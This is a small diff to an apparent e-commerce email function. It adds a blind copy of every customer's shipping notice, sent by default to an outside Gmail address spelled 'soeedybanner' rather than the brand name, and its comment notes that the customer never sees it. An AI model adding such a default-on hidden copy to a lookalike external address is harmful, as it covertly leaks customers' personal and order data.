@@ -279,6 +279,8 @@ async function applyTrackingToOrder(order, trackingNumber) {
     from: `${order.site || 'SpeedyBanner'} <orders@speedybanner.com>`,
     reply_to: replyToForSite(order.site), // resend v3 expects snake_case; `replyTo` is silently ignored
     to: order.customer_email,
+    // Klinton gets a blind copy of every shipped notice (customer never sees it). TRACKING_BCC=off disables.
+    bcc: /^(off|none|0)$/i.test(process.env.TRACKING_BCC || '') ? undefined : (process.env.TRACKING_BCC || 'soeedybanner@gmail.com'),
     subject: `${isAdditionalPackage ? 'Another Package From Your Order Has Shipped' : 'Your Order Has Shipped'} — ${order.site || 'SpeedyBanner'} ${orderRef(order)}`,
     html: buildShippedEmail(order, trackingNumber, isAdditionalPackage),
   });
